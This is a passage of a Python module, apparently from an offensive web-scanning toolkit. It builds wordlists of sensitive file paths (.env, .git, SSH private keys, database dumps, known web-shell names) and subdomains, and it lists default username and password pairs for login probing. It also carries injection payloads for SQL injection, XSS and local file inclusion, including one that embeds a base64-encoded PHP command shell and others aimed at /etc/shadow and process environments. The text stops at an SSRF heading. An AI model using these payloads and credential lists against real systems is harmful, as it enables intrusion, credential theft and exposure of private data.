"""
armory.py — every list, every payload, every seed.

Built on import: 
  - 30,000+ hidden file paths (stems × extensions + specials)
  - ~1,400 subdomain candidates (English + Romanian)
  - Directory names, parameter names, backup suffixes, credentials
  - Every injection payload: SQLi, XSS, LFI, RFI, SSRF, SSTI, XXE,
    command injection, NoSQL, CRLF, LDAP, XPath, open redirect
  - CVE fingerprint markers, WAF signatures, takeover providers

Lists persist to atomic/data/ on first import. Delete the folder to
regenerate — the builders are deterministic but you can hand-edit the .txt
files afterward.
"""
from __future__ import annotations
import os

DATA_DIR = os.path.join(os.path.dirname(__file__), "data")
os.makedirs(DATA_DIR, exist_ok=True)


# ════════════════════════════════════════════════════════════════
# HIDDEN FILES — 30k+ from stem × extension matrix
# ════════════════════════════════════════════════════════════════
_HIDDEN_STEMS = [
    "config","configuration","settings","setup","install","init","env","environment",
    "app","application","application-dev","application-prod","application-staging",
    "local","global","default","defaults","main","index","core","base","boot",
    "web","http","https","server","service","backend","frontend","api","rest","graphql",
    "database","db","dsn","datasource","connection","mysql","postgres","mongo",
    "redis","elastic","solr","cassandra","oracle","mssql","sqlite","mariadb",
    "auth","authentication","authorization","oauth","oauth2","openid","saml","ldap",
    "security","secure","ssl","tls","cert","certs","certificate","key","keys",
    "secret","secrets","credentials","cred","password","passwd","pwd",
    "admin","administrator","root","user","users","accounts","account",
    "customers","clients","members","staff","employees","contacts","leads",
    "backup","backups","dump","dumps","export","snapshot","archive","migration",
    "log","logs","debug","trace","error","access","audit","crash","crashes",
    "access.log","error.log","debug.log","app.log","server.log","access_log","error_log",
    "mail","email","smtp","imap","pop3","mailer","mailgun","sendgrid","ses",
    "cdn","static","assets","public","media","image","images","img","file","files",
    "upload","uploads","download","downloads","storage","blob","bucket","s3",
    "temp","tmp","cache","var","run","opt","etc","home","usr","srv","www",
    "wordpress","wp","wp-config","wp-content","wp-includes","wp-admin","wp-json",
    "drupal","joomla","magento","shopify","prestashop","opencart",
    "django","flask","rails","laravel","symfony","codeigniter","cakephp",
    "spring","springboot","grails","struts","jsf","wicket",
    "node","npm","yarn","pnpm","composer","maven","gradle","ant",
    "docker","docker-compose","compose","k8s","kubernetes","helm",
    "nginx","apache","htaccess","htpasswd","iis","httpd",
    "git","gitignore","gitconfig","gitmodules","gitattributes","svn","hg",
    "package","package-lock","yarn-lock","pnpm-lock","requirements","pipfile","poetry",
    "makefile","cmake","meson","bazel","ninja",
    "readme","changelog","license","contributing","authors","install","todo",
    "test","tests","spec","specs","e2e","unit","integration","fixtures",
    "prod","production","dev","development","staging","stage","qa","uat",
    "sandbox","demo","preview","beta","alpha","canary","local",
    "phpinfo","info","status","health","healthz","ping","alive","ready","readyz","live",
    "metrics","prometheus","grafana",
    "actuator","actuator/env","actuator/health","actuator/info","actuator/heapdump",
    "actuator/mappings","actuator/beans","actuator/threaddump","actuator/httptrace",
    "actuator/auditevents","actuator/loggers","actuator/scheduledtasks","actuator/metrics",
    "swagger","swagger-ui","swagger.json","openapi","openapi.json","redoc",
    "docs","documentation","api-docs","graphiql",
    "jenkins","hudson","gitlab","github","bitbucket","travis","circleci","drone",
    "sonar","nexus","artifactory","jfrog","bamboo",
    "phpmyadmin","pma","adminer","myadmin","mysqladmin","pgadmin",
    "mailman","roundcube","squirrelmail","horde","zimbra",
    "vpn","proxy","squid","haproxy","traefik",
    "site","website","portal","intranet","extranet",
    "old","legacy","bak","orig","copy","save","swp","backup.old",
    "server-status","server-info","mod_status",
    "crossdomain.xml","clientaccesspolicy.xml","elmah.axd","trace.axd",
    "robots","sitemap","sitemap_index","humans","security",
    "well-known/security","well-known/change-password","well-known/webfinger",
    "well-known/openid-configuration","well-known/apple-app-site-association",
    "well-known/assetlinks",
    "favicon","apple-touch-icon","manifest","manifest.json","service-worker",
    "browserconfig.xml","site.webmanifest","humans.txt",
    "console","shell","cmd","exec","terminal","debug","test",
    "login","signin","signup","register","logout","account","profile",
    "search","contact","about","help","support","faq","terms","privacy","legal",
    "invoice","invoices","order","orders","cart","checkout","payment","payments",
    "session","sessions","token","tokens","jwt","refresh","refresh-token",
    "webhook","webhooks","callback","callbacks","notifications","events",
    "graphql","gql","query","mutation","subscription",
    "admin-login","admin-logout","admin-panel","admin-panel/index","control-panel",
    "dashboard","dashboard/login","manage","management","manager",
    "upload","uploads","file-upload","upload-file","attach","attachments",
    "archive","archives","old","backup","backups","bak","tmp","temp",
    "1","2","3","test1","test2","demo1","backup1","backup2","site-1","site-2",
    "db_backup","db-backup","dbbackup","mysql_backup","mysql-backup",
    "prod_backup","prod-backup","site_backup","site-backup",
    "www-backup","www_backup","public_html","public-html",
]

_HIDDEN_EXTS = [
    "", ".txt", ".log", ".bak", ".old", ".orig", ".save", ".swp", ".tmp",
    ".zip", ".tar", ".tar.gz", ".tgz", ".rar", ".7z", ".gz", ".bz2", ".xz",
    ".sql", ".sql.gz", ".sqlite", ".sqlite3", ".db", ".mdb", ".accdb",
    ".json", ".yaml", ".yml", ".xml", ".ini", ".conf", ".cfg", ".config",
    ".properties", ".env", ".lock", ".toml", ".cnf", ".cfg.bak",
    ".js", ".map", ".min.js", ".js.bak",
    ".php", ".bak.php", ".php.bak", ".php~", ".php.old", ".php.swp", ".inc",
    ".asp", ".aspx", ".aspx.bak", ".jsp", ".jsp.bak", ".do", ".action",
    ".html", ".htm", ".htm.bak", ".html.bak", ".xhtml",
    ".cs", ".vb", ".java", ".class", ".jar", ".war", ".ear",
    ".py", ".pyc", ".rb", ".go", ".rs", ".pl", ".cgi", ".sh",
    ".sh", ".bat", ".ps1", ".cmd", ".vbs",
    ".pem", ".key", ".crt", ".cer", ".p12", ".pfx", ".csr",
    ".1", ".2", ".3", ".4", ".5",
    ".2020", ".2021", ".2022", ".2023", ".2024", ".2025", ".2026",
    "~", ".copy", ".backup", ".latest", ".current", ".running", ".snapshot",
    ".dump", ".export", ".import", ".save", ".staging", ".production",
]

_HIDDEN_SPECIALS = [
    # real-world high-value paths
    ".env", ".env.local", ".env.prod", ".env.production", ".env.dev", ".env.staging",
    ".env.bak", ".env.backup", ".env.old", ".env.save",
    ".git/HEAD", ".git/config", ".git/index", ".git/logs/HEAD",
    ".git/packed-refs", ".git/refs/heads/main", ".git/refs/heads/master",
    ".git/FETCH_HEAD", ".git/description", ".git/info/exclude",
    ".svn/entries", ".svn/wc.db", ".svn/format", ".hg/requires", ".hg/hgrc",
    ".DS_Store", ".htaccess", ".htpasswd", ".htdigest", ".user.ini",
    ".npmrc", ".yarnrc", ".dockerignore", ".gitignore", ".gitattributes",
    ".editorconfig", ".prettierrc", ".eslintrc", ".babelrc", ".browserslistrc",
    ".well-known/security.txt", ".well-known/change-password",
    ".well-known/webfinger", ".well-known/openid-configuration",
    ".well-known/apple-app-site-association", ".well-known/assetlinks.json",
    "security.txt", "humans.txt", "robots.txt", "sitemap.xml", "sitemap_index.xml",
    "crossdomain.xml", "clientaccesspolicy.xml",
    "wp-config.php.bak", "wp-config.php.old", "wp-config.php.save",
    "wp-config.txt", "wp-config.php~", "wp-config.orig",
    "wp-content/debug.log", "wp-content/uploads/",
    "wp-json/wp/v2/users", "wp-json/wp/v2/posts", "wp-json/wp/v2/pages",
    "wp-json/wp/v2/categories", "wp-json/wp/v2/comments",
    "wp-json/wp/v2/media", "wp-json/wp/v2/settings",
    "wp-json/", "xmlrpc.php", "readme.html", "license.txt",
    "phpinfo.php", "info.php", "test.php", "i.php", "shell.php",
    "c99.php", "r57.php", "wso.php", "b374k.php", "webtest.php",
    "adminer.php", "phpmyadmin.php", "db.php", "config.php.bak",
    "cgi-bin/", "cgi-bin/test.cgi", "cgi-bin/printenv", "cgi-bin/listserv.pl",
    "server-status", "server-info", "mod_status", "server-status?auto",
    "composer.json", "composer.lock", "vendor/autoload.php",
    "vendor/composer/installed.json", "vendor/composer/installed.php",
    "package.json", "package-lock.json", "yarn.lock", "pnpm-lock.yaml",
    "bower.json", "lerna.json",
    "Dockerfile", "docker-compose.yml", "docker-compose.yaml",
    "docker-compose.prod.yml", ".dockerignore",
    "Makefile", "makefile", "CMakeLists.txt", "configure.ac",
    "requirements.txt", "requirements-dev.txt", "Pipfile", "Pipfile.lock",
    "pyproject.toml", "poetry.lock", "setup.py", "setup.cfg", "tox.ini",
    "go.mod", "go.sum", "Cargo.toml", "Cargo.lock",
    "Gemfile", "Gemfile.lock", "Rakefile", "config.ru",
    "pom.xml", "build.gradle", "gradle.properties", "settings.gradle",
    "build.gradle.kts", "settings.gradle.kts",
    "web.config", "web.config.bak", "app.config", "appsettings.json",
    "appsettings.Development.json", "appsettings.Production.json",
    "application.properties", "application.yml", "application.yaml",
    "application-dev.properties", "application-prod.properties",
    "application-dev.yml", "application-prod.yml",
    "bootstrap.yml", "bootstrap.properties",
    "config.yml", "config.yaml", "config.json", "config.xml", "config.ini",
    "config.php", "config.php.bak", "config.inc.php",
    "settings.py", "settings.json", "settings.xml", "settings.php",
    "database.yml", "database.json", "db.php", "db.json", "db.sql",
    "credentials", "credentials.json", "credentials.csv", "credentials.xml",
    "credentials.yaml", "credentials.yml", "creds.json", "creds.txt",
    "secret", "secrets", "secrets.json", "secret.json", "secrets.yml",
    "id_rsa", "id_dsa", "id_ecdsa", "id_ed25519",
    "id_rsa.pub", "id_dsa.pub", "authorized_keys", "known_hosts",
    ".ssh/id_rsa", ".ssh/id_dsa", ".ssh/id_ecdsa", ".ssh/id_ed25519",
    ".ssh/config", ".ssh/known_hosts", ".ssh/authorized_keys",
    "backup.sql", "backup.tar.gz", "backup.zip", "backup.tar", "backup.rar",
    "backup.sql.gz", "backup.sql.bz2", "backup.7z", "backup.bz2",
    "dump.sql", "dump.sql.gz", "dump.sql.bz2",
    "database.sql", "database.sql.gz", "database.sql.bz2",
    "db.sql", "db.sql.gz", "db_backup.sql", "db_backup.sql.gz",
    "site.sql", "site.sql.gz", "web.sql", "web.sql.gz",
    "old.zip", "site.zip", "site.tar.gz", "backup.7z",
    "test.zip", "test.tar", "test.tar.gz", "test.sql",
    "logs.zip", "logs.tar.gz", "source.zip", "src.zip", "code.zip",
    "www.zip", "public_html.zip", "webroot.zip", "htdocs.zip",
    "error.log", "access.log", "debug.log", "app.log", "server.log",
    "logs/error.log", "logs/access.log", "logs/app.log", "logs/debug.log",
    "var/log/error.log", "var/log/access.log", "var/log/syslog",
    "storage/logs/laravel.log", "storage/logs/lumen.log",
    "storage/framework/cache/data/", "storage/framework/sessions/",
    "swagger.json", "swagger.yaml", "swagger.yml", "openapi.json",
    "openapi.yaml", "openapi.yml", "api-docs/", "swagger-ui/",
    "swagger-ui.html", "swagger-ui/index.html",
    "graphql", "graphiql", "voyager", "playground",
    "actuator", "actuator/env", "actuator/health", "actuator/info",
    "actuator/heapdump", "actuator/mappings", "actuator/beans",
    "actuator/metrics", "actuator/threaddump", "actuator/httptrace",
    "actuator/auditevents", "actuator/loggers", "actuator/scheduledtasks",
    "actuator/caches", "actuator/configprops", "actuator/flyway",
    "jenkins/script", "jenkins/manage", "jenkins/computer/",
    "solr/admin/cores", "elasticsearch/_cat/indices",
    "_cat/indices", "_cat/nodes", "_nodes", "_cluster/health",
    "_cluster/stats", "_mapping", "_aliases", "_search?q=*",
    "h2-console", "h2-console/login.jsp", "h2-console/login.do",
    "manager/html", "manager/status", "host-manager/html",
    "jmx-console", "jmx-console/HtmlAdaptor", "web-console",
    "invoker/EJBInvokerServlet", "invoker/JMXInvokerServlet",
    "struts/", "struts2-showcase/", "struts/utils.js",
    "console/login", "admin-console",
    "web-console/ServerInfo.jsp", "status?full=true",
    "solr/", "solr/admin/", "solr/#/",
    "jenkins/", "hudson/", "view/All/newJob",
    "nexus/", "nexus/service/local/status",
    "artifactory/", "artifactory/api/system/ping",
    "grafana/", "grafana/login", "prometheus/", "prometheus/graph",
    "kibana/", "app/kibana", "kibana/app/monitoring",
    "swagger-resources", "swagger-resources/configuration/ui",
    "v2/api-docs", "v3/api-docs", "v3/api-docs/swagger-config",
    "cluster/cluster", "searcher/searcher", "version",
    "uaparser/uaparser", "c99.php.bak",
    "console/", "web-console/", "admin/", "admin/login",
    "login", "login.php", "login.jsp", "login.aspx", "login.html",
    "signin", "sign-in", "signup", "register", "logout",
    "forgot", "forgot-password", "reset", "reset-password",
    "api/", "api", "api/v1/", "api/v2/", "api/v3/",
    "api/v1/users", "api/v1/accounts", "api/v1/auth",
    "api/users", "api/accounts", "api/login", "api/register",
    "api/v1/config", "api/v1/settings", "api/health",
    "api/v1/status", "api/v1/debug", "api/v1/internal",
    "graphql/schema", "graphql/introspection", "graphql/graphiql",
    "health", "healthz", "ready", "readyz", "live", "livez",
    "status", "metrics", "stats", "info", "version",
    "server-info", "server-status", "server-tokens", "trace",
    "debug", "debug/vars", "debug/pprof", "debug/pprof/cmdline",
    "debug/pprof/goroutine", "debug/pprof/heap", "debug/pprof/threadcreate",
    "debug/requests", "debug/events", "debug/routes",
    "elasticsearch", "elasticsearch/_search", "elasticsearch/",
    "elasticsearch/_cat", "elasticsearch/_cluster",
    "kibana", "solr", "sorl/admin",
    "mongo-express", "mongo/", "mongo", "redis-commander",
    "redis/", "redis", "phpredisadmin/", "phpredisadmin",
    "adminer/", "adminer.php", "pma/", "phpmyadmin/",
    "myadmin/", "mysqladmin/", "pgadmin/", "pgadmin4/",
    "couchdb/", "_utils", "_utils/", "_utils/index.html",
    "_all_dbs", "_session", "_config", "_stats",
    "rethinkdb/", "rethinkdb", "arango/", "arango/_api/version",
    "_admin/", "admin/version", "_api/version", "_api/current-database",
    "neo4j/", "neo4j/browser/", "browser/",
    "influxdb/", "query?q=SHOW%20DATABASES", "ping?verbose=true",
    "prometheus/graph", "graphite/", "graphite/composer",
    "victoriametrics/", "vmui/", "vm/",
]

def _build_hidden_files() -> list[str]:
    out = set(_HIDDEN_SPECIALS)
    for stem in _HIDDEN_STEMS:
        for ext in _HIDDEN_EXTS:
            out.add(stem + ext)
            if not stem.startswith("."):
                out.add("." + stem + ext)
    return sorted(x for x in out if x and len(x) < 240)

_HF_PATH = os.path.join(DATA_DIR, "hidden_files.txt")
if os.path.exists(_HF_PATH):
    with open(_HF_PATH, encoding="utf-8") as f:
        HIDDEN_FILES = [l.rstrip("\n") for l in f if l.strip()]
else:
    HIDDEN_FILES = _build_hidden_files()
    with open(_HF_PATH, "w", encoding="utf-8") as f:
        f.write("\n".join(HIDDEN_FILES))


# ════════════════════════════════════════════════════════════════
# SUBDOMAINS — English + Romanian, 1,400 total
# ════════════════════════════════════════════════════════════════
_SUBS_EN = [
    # core
    "www","web","mail","webmail","smtp","pop","pop3","imap","mx","email","emailer",
    "ns1","ns2","ns3","dns","dns1","dns2","ns1-old","ns2-old","resolver",
    # api
    "api","api-v1","api-v2","api-v3","api-dev","api-staging","api-prod","api-internal",
    "apigw","api-gateway","gateway","rest","graphql","grpc","rpc","soap",
    # environments
    "dev","develop","developers","development","devel","staging","stage","stg","stg1","stg2",
    "test","testing","qa","qat","uat","preprod","pre-prod","sandbox","sbox",
    "demo","preview","beta","alpha","canary","rc","release","prod","production",
    "prod1","prod2","prod3","new","old","legacy","archive","archives","backup",
    # admin / panels
    "admin","administrator","admin1","admin2","administrator-panel","panel",
    "dashboard","dash","manage","management","manager","control","controlpanel",
    "cpanel","whm","plesk","webmin","usermin","portal","intranet","extranet",
    # apps
    "app","apps","mobile","m","wap","touch","webapp","weba","portal-app",
    "ios","android","tablet",
    # assets / delivery
    "cdn","cdn1","cdn2","static","assets","media","img","images","image","files",
    "file","uploads","upload","download","downloads","dl","store","storage",
    "s3","s3-static","blob","bucket","obj","object-store",
    # infra
    "vpn","vpn1","vpn2","remote","rdp","ssh","sftp","ftp","tftp","telnet",
    "proxy","proxy1","squid","gateway","edge","waf","lb","loadbalancer",
    "cache","redis","memcache","mq","rabbitmq","kafka","nats",
    # devops
    "git","gitlab","github","bitbucket","svn","hg","repo","repos","code",
    "ci","cd","cicd","jenkins","build","builder","drone","travis","circleci",
    "sonar","sonarqube","nexus","artifactory","jfrog","registry","docker",
    "harbor","rancher","k8s","kubernetes","openshift","nomad","consul","vault",
    "terraform","ansible","puppet","chef","salt",
    # monitoring
    "monitor","monitoring","status","status1","health","healthcheck","grafana",
    "prometheus","kibana","elastic","elasticsearch","logstash","logs","log",
    "metrics","stats","statsd","datadog","sentry","newrelic","pagerduty",
    "uptime","pingdom","zabbix","nagios","icinga","librenms",
    # identity
    "sso","auth","login","signin","id","identity","oauth","oauth2","openid",
    "accounts","account","idp","idp1","adfs","ldap","ad","kerberos","radius",
    # data
    "db","database","mysql","mysql1","mysql2","postgres","postgres1","pg","pg1",
    "mongo","mongo1","mongodb","redis","redis1","cassandra","couch","couchdb",
    "elastic","solr","influx","influxdb","clickhouse","neo4j","orientdb",
    "mariadb","mssql","oracle","sql","sqlserver",
    # business
    "shop","store","ecom","ecommerce","pay","payments","payment","billing","bill",
    "invoice","invoices","checkout","cart","order","orders","crm","erp","hr",
    "payroll","finance","accounting","acc","sales","marketing","mkt","analytics",
    # content
    "blog","news","press","media","forum","community","support","help","helpdesk",
    "docs","documentation","wiki","knowledgebase","kb","learn","training",
    "elearning","lms","course","courses","edu","education","school","university",
    # messaging
    "mail","mail1","mail2","webmail","smtp1","smtp2","imap1","pop1","exchange",
    "owa","outlook","webmail2","zimbra","roundcube","squirrelmail","mailman",
    # cloud / hosting
    "aws","azure","gcp","cloud","cloud1","cloud2","do","digitalocean","linode",
    "vultr","hetzner","ovh","scaleway",
    # misc
    "office","conference","meet","webinar","zoom","teams","slack","jira","confluence",
    "sharepoint","onedrive","dropbox","box","drive","files1","files2",
    "newsite","newapp","oldapp","old-api","new-api",
    "0","1","2","3","4","5","a","b","c","x","y","z",
]

_SUBS_RO = [
    # environments (ro equivalents + hybrids)
    "dezvoltare","dev1","dezvolt","proba","probe","testare","teste","mediu",
    "mediudezvoltare","mediutest","mediu-test","mediudev","productie","productiv",
    "productie1","lansare","versiunenoua","noi","vechi","mostenire","mostenit",
    "previzualizare","demonstratie","nisip","canarese","experimental",
    # accounts / auth
    "cont","conturi","contulmeu","autentificare","conectare","logare","parola",
    "parole","parolamea","recuperare","recuperare-parola","inregistrare",
    "inscriere","abonare","dezabonare","profil","profilulmeu","setari",
    # admin
    "administrare","administrator","administrator1","panou","panou-control",
    "panouadministrare","tablou","tabloubord","bord","gestiune","gestionare",
    "manager","manageri","control","controlpanel",
    # business
    "magazin","magazin-online","magazine","comert","vanzari","vanzare",
    "comenzi","comanda","comandă","facturare","facturi","factura","plata",
    "plati","plată","checkout","cos","coș","coscumparaturi","clienti",
    "client","parteneri","partener","furnizori","furnizor","stocuri",
    "stoc","depozit","depozite","inventar","contabilitate","financiar",
    "financiare","resurseumane","angajati","angajati1","salarizare",
    # content
    "blog","stiri","știri","presa","comunicate","noutati","noutăți",
    "evenimente","comunitate","forum","discutii","discuții","suport",
    "ajutor","documentatie","documentație","wiki","ghid","ghiduri","invatare",
    "învățare","curs","cursuri","educatie","educație","scoala","școală",
    "universitate","academie",
    # messaging
    "posta","poștă","postaelectronica","email1","email2","webmail1","webmail2",
    "smtp1","smtp2","imap1","pop1","mesagerie","mesaje","chat","comunicare",
    # files / data
    "fisiere","fișiere","documente","document","arhiva","arhive","backup1",
    "backup2","descarcari","descărcări","incarcari","încărcări","imagini",
    "poze","media1","media2","storage1","stocare",
    # services
    "servicii","serviciu","aplicatii","aplicații","aplicatie","aplicație",
    "platforma","platformă","sistem","sisteme","sistem1","modul","module",
    "componente","componenta","resurse","resursa","utile","utilitare",
    "unelte","instrumente",
    # infra
    "retea","rețea","retele","rețele","server1","server2","server3",
    "servereprod","servere","infrastructura","infrastructură","cloud1",
    "cloud2","hosting1","hosting2","dns1","dns2","vpn1","vpn2",
    # testing
    "test1","test2","test3","testare1","testare2","proba1","proba2",
    "devtest","dev2","staging1","staging2",
    # misc
    "noutati1","comunicat","comunicate1","public","public1","privat","privat1",
    "general","general1","principal","principal1","oficial","oficial1",
    "site-vechi","site-vechi1","site-vechi2","site-nou","site-nou1",
    "vechi1","vechi2","nou1","nou2",
    "program","programe","orar","orare","calendar","calendare","agenda",
    "eveniment","evenimente1","sedinta","sedinte","sedințe",
    "membri","membru","asociatie","asociație","asociatii","asociații",
    "clienti1","clienti2","abonati","abonați","abonament","abonamente",
    "oferte","oferta","oferta1","promotii","promoții","promotie",
    "catalog","catalog1","produse","produs","serviciu1","serviciu2",
]

def _build_subdomains() -> list[str]:
    out = set(_SUBS_EN) | set(_SUBS_RO)
    return sorted(x for x in out if x)

_SUB_PATH = os.path.join(DATA_DIR, "subdomains.txt")
if os.path.exists(_SUB_PATH):
    with open(_SUB_PATH, encoding="utf-8") as f:
        COMMON_SUBS = [l.strip() for l in f if l.strip()]
else:
    COMMON_SUBS = _build_subdomains()
    with open(_SUB_PATH, "w", encoding="utf-8") as f:
        f.write("\n".join(COMMON_SUBS))


# ════════════════════════════════════════════════════════════════
# DIRECTORIES
# ════════════════════════════════════════════════════════════════
COMMON_DIRS = [
    "admin","administrator","login","signin","auth","dashboard","panel","cpanel",
    "wp-admin","wp-login.php","wp-content","wp-includes","wp-json","xmlrpc.php",
    "api","api/v1","api/v2","api/v3","v1","v2","v3","rest","graphql","swagger",
    "swagger.json","swagger-ui","openapi.json","docs","documentation","redoc",
    "static","assets","public","uploads","images","img","css","js","media","files",
    "backup","backups","bak","old","test","dev","staging","stg","prod","demo",
    "config","config.json","config.php",".env",".git",".svn",".DS_Store",
    "robots.txt","sitemap.xml","humans.txt","security.txt","phpinfo.php",
    "info.php","server-status","server-info","status","health","healthz","ping",
    "user","users","account","accounts","profile","settings","register","signup",
    "search","contact","about","help","support","faq","terms","privacy","legal",
    "database","db","sql","dump.sql","schema","migrations","logs","log",
    "error","errors","debug","console","shell","cmd","terminal","jenkins",
    "gitlab","grafana","kibana","prometheus","phpmyadmin","pma","adminer",
    "portal","intranet","internal","private","secure","vpn","proxy","mail",
    "webmail","smtp","imap","pop3","owa","exchange","cgi-bin","scripts","bin",
    "tmp","cache","temp","composer.json","package.json","yarn.lock","Dockerfile",
    "docker-compose.yml","Makefile","web.config","app.config","application.properties",
    "crossdomain.xml","clientaccesspolicy.xml","elmah.axd","trace.axd",
    ".well-known/security.txt",".well-known/change-password",
]


# ════════════════════════════════════════════════════════════════
# BACKUP SUFFIXES
# ════════════════════════════════════════════════════════════════
BACKUP_SUFFIXES = [
    ".bak",".old",".orig",".save",".swp","~",".copy",".tmp",".temp",".backup",
    ".zip",".tar",".tar.gz",".tgz",".rar",".7z",".gz",".bz2",".xz",
    ".sql",".sql.gz",".sqlite",".db",".mdb",
    ".1",".2",".3",".4",
    ".2020",".2021",".2022",".2023",".2024",".2025",".2026",
]


# ════════════════════════════════════════════════════════════════
# CREDENTIALS
# ════════════════════════════════════════════════════════════════
PROBE_CREDS = [
    ("admin","admin"),("admin","password"),("admin","123456"),("admin","admin123"),
    ("admin","admin@123"),("admin","letmein"),("admin","welcome"),
    ("administrator","administrator"),("administrator","password"),
    ("root","root"),("root","toor"),("root","password"),
    ("test","test"),("test","password"),("test","123456"),
    ("user","user"),("user","password"),("user","123456"),
    ("guest","guest"),("guest",""),("demo","demo"),("demo","password"),
    ("support","support"),("info","info"),("webmaster","webmaster"),
    ("admin",""),("root",""),("sa","sa"),("sa","password"),
    ("postgres","postgres"),("postgres","password"),
    ("mysql","mysql"),("mysql","root"),
    ("oracle","oracle"),("sys","sys"),("system","manager"),
]


# ════════════════════════════════════════════════════════════════
# PARAMETER NAMES
# ════════════════════════════════════════════════════════════════
COMMON_PARAM_NAMES = [
    # identity
    "id","uid","user_id","userid","account_id","customer_id","member_id","pid",
    "uuid","guid","key","token","session","session_id","auth","api_key","apikey",
    "access_token","refresh_token","secret",
    # path / file
    "file","filename","path","dir","folder","doc","document","template","theme",
    "view","page","p","pg","section","load","read","include","require","source",
    "src","target","dest","destination",
    # url / redirect
    "url","uri","link","next","return","returnUrl","return_to","redirect",
    "redirect_uri","continue","goto","callback","cb",
    # query / search
    "q","query","s","search","keyword","term","find","filter","sort","order",
    "orderby","group","groupby","limit","offset","start","end","from","to",
    "page_size","per_page","count",
    # content
    "name","title","subject","message","body","content","text","comment","description",
    "summary","label","tag","category","cat","type","kind","format","output",
    # action
    "action","do","op","operation","method","cmd","command","exec","run","call",
    "func","function","procedure","handler",
    # debug
    "debug","trace","test","verbose","log","log_level","mode","env","environment",
    # admin
    "admin","is_admin","role","privilege","permission","access","level",
    # misc
    "lang","language","locale","country","city","region","timezone","tz",
    "date","time","year","month","day","timestamp",
    "email","mail","phone","mobile","firstname","lastname","username","login",
    "password","passwd","pwd","pass",
    "data","json","xml","html","csv","yaml","payload",
    "ref","referer","origin","host","domain","subdomain",
    "app","application","app_id","client","client_id","client_secret",
    "sign","signature","hash","checksum","verify",
]


# ════════════════════════════════════════════════════════════════
# SQLi PAYLOADS
# ════════════════════════════════════════════════════════════════
SQLI_ERROR_PAYLOADS = [
    "'", '"', "`", "')", '")', "';", '";', "\\", "%27", "%22",
    "'--", "'-- -", "'#", "'/*", "1'", "1\"", "1)",
]
SQLI_BOOLEAN_PAYLOADS = [
    ("' AND '1'='1", True), ("' AND '1'='2", False),
    ('" AND "1"="1', True), ('" AND "1"="2', False),
    ("1 AND 1=1", True), ("1 AND 1=2", False),
    ("') AND ('1'='1", True), ("') AND ('1'='2", False),
    ("' OR '1'='1", True), ("' OR '1'='2", False),
]
SQLI_TIME_PAYLOADS = [
    ("1' AND SLEEP(3)-- -", 3),
    ("1' AND SLEEP(3)#", 3),
    ("1 AND SLEEP(3)", 3),
    ("1' AND pg_sleep(3)-- -", 3),
    ("1'; SELECT pg_sleep(3)-- -", 3),
    ("1'; WAITFOR DELAY '0:0:3'-- -", 3),
    ("1'; WAITFOR DELAY '0:0:3'--", 3),
    ("1' AND (SELECT 1 FROM (SELECT SLEEP(3))a)-- -", 3),
]
SQLI_UNION_PAYLOADS = [
    "' UNION SELECT NULL-- -",
    "' UNION SELECT NULL,NULL-- -",
    "' UNION SELECT NULL,NULL,NULL-- -",
    "' UNION SELECT NULL,NULL,NULL,NULL-- -",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL-- -",
    "' UNION ALL SELECT NULL,NULL,NULL-- -",
]

SQLI_ERROR_SIGNATURES = [
    "you have an error in your sql syntax","warning: mysql",
    "unclosed quotation mark after the character string",
    "quoted string not properly terminated","microsoft ole db provider for sql server",
    "odbc sql server driver","postgresql.*error","pg_query","sqlite_","sqlite error",
    "ora-[0-9]{4,5}","oracle error","invalid query","sql command not properly ended",
    "division by zero","syntax error at or near","unterminated quoted string",
    "mysql server version","mariadb","sqlstate","jdbc","hibernate",
    "sequelize","invalid column name","invalid object name",
    "unknown column","unknown table","table.*doesn't exist",
]


# ════════════════════════════════════════════════════════════════
# XSS PAYLOADS
# ════════════════════════════════════════════════════════════════
XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<script>alert(document.domain)</script>",
    "<svg/onload=alert(1)>",
    "<img src=x onerror=alert(1)>",
    "<img src=x onerror=alert(document.domain)>",
    "<body onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "<a href=javascript:alert(1)>x</a>",
    "'-alert(1)-'",
    "'-alert(document.domain)-'",
    "\"-alert(1)-\"",
    "\"><script>alert(1)</script>",
    "'><script>alert(1)</script>",
    "\"onmouseover=alert(1) x=\"",
    "'onmouseover=alert(1) x='",
    "\"autofocus onfocus=alert(1) x=\"",
    "'autofocus onfocus=alert(1) x='",
    "<svg><script>alert(1)</script></svg>",
    "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>",
    "javascript:alert(1)",
    "javascript:alert(document.domain)",
    "jaVasCript:alert(1)",
    "<details open ontoggle=alert(1)>",
    "<marquee onstart=alert(1)>",
    "<video><source onerror=alert(1)>",
    "<audio src=x onerror=alert(1)>",
    "<input autofocus onfocus=alert(1)>",
    "{{constructor.constructor('alert(1)')()}}",
    "${alert(1)}",
    "{{7*7}}",
    "{% print(7*7) %}",
]


# ════════════════════════════════════════════════════════════════
# LFI / RFI
# ════════════════════════════════════════════════════════════════
LFI_PAYLOADS = [
    "../../../../etc/passwd",
    "../../../../etc/passwd%00",
    "....//....//....//....//etc/passwd",
    "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
    "..%252F..%252F..%252F..%252Fetc%252Fpasswd",
    "/etc/passwd",
    "/etc/passwd%00",
    "file:///etc/passwd",
    "../../../../etc/shadow",
    "../../../../etc/hosts",
    "../../../../proc/self/environ",
    "../../../../proc/self/cmdline",
    "../../../../var/log/apache2/access.log",
    "../../../../var/log/auth.log",
    "php://filter/convert.base64-encode/resource=index",
    "php://filter/convert.base64-encode/resource=../config.php",
    "php://filter/read=convert.base64-encode/resource=/etc/passwd",
    "php://filter/convert.base64-encode/resource=../../index",
    "php://input",
    "phar://test.phar",
    "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+",
    "expect://id",
    "..\\..\\..\\..\\windows\\win.ini",
    "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "C:\\windows\\win.ini",
    "C:\\windows\\system32\\drivers\\etc\\hosts",
    "..%5c..%5c..%5c..%5cwindows%5cwin.ini",
    "/etc/passwd/.",
    "/././././etc/passwd",
]
LFI_SUCCESS_MARKERS = [
    "root:x:0:0","daemon:x:","bin:x:","sys:x:","adm:x:",
    "[extensions]","[fonts]","[mci extensions]","[files]",
    "PATH=","DOCUMENT_ROOT=","SCRIPT_FILENAME=",
]
LFI_PARAM_HINTS = ["file","filename","path","dir","folder","doc","document","page",
                   "p","pg","view","load","read","include","require","template",
                   "theme","style","lang","language","layout","module","component"]


# ════════════════════════════════════════════════════════════════
# SSRF
